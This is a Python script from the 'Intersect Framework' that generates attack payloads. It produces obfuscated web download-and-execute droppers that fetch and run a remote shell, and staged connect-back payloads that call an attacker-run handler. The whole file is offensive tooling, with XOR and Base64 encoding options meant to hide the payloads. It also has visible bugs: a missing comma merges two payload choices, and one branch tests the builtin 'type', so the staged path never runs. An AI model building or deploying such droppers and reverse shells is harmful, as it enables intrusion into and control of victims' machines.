#!/usr/bin/python
# Intersect Framework (c) 2012
# Simple web download-exec Intersect dropper
# dl's a remote Intersect shell, saves and executes

import os, sys
import argparse
from src import core
from src import payloads
import base64

 
help = ("""%sWeb-Download & Execute (webdl)%s:                      
Creates small Python script that downloads an Intersect shell from  
a remote URL, saves it to a file and executes. The webdl payload can be
obfuscated with either XOR or Base64.                    
                                                                    
%sStaged Payload (staged)%s:                                                  
Generates small connect-back shellcode. When executed on the target system,
it will connect to your handler, download the full Intersect shell and execute.
You must setup a listening Intersect handler to receive the connection.
"""% (core.uline, core.reset, core.uline, core.reset))

parser = argparse.ArgumentParser(description=help, prog="payload")
parser.add_argument("--type", help="payload to generate", choices=["webdl", "staged" "cpp", "php", "asp"], required=True)
parser.add_argument("--host", help="local host/IP address (staged)")
parser.add_argument("--port", help="local port number (staged)", type=int)
parser.add_argument("--url", help="full download url (webdl)")
parser.add_argument("--enc", help="payload encoding", choices=["b64", "xor1", "xor4", "babbel"])
parser.add_argument("--out", help="output file name", required=True)
args = parser.parse_args()
payload = args.out

if args.type == "webdl":
    if args.url != "":
        url = args.url
        if args.enc != "":
            payloads.web_payload(url, payload, args.enc)
        else:
            payloads.web_payload(url, payload)
    else:
        core.warning("must specify download url!")
        sys.exit(0)
        
elif type == "staged":
    if args.host != "":
        host = args.host
        if args.port != "":
            port = args.port
            if args.enc != "":
                payloads.staged_payload(host, port, payload, args.enc)
            else:
                payloads.staged_payload(host, port, payload)
        else:
            core.warning("must specify port number!")
            sys.exit(0)
    else:
        core.warning("must specify host name!")
        sys.exit(0)

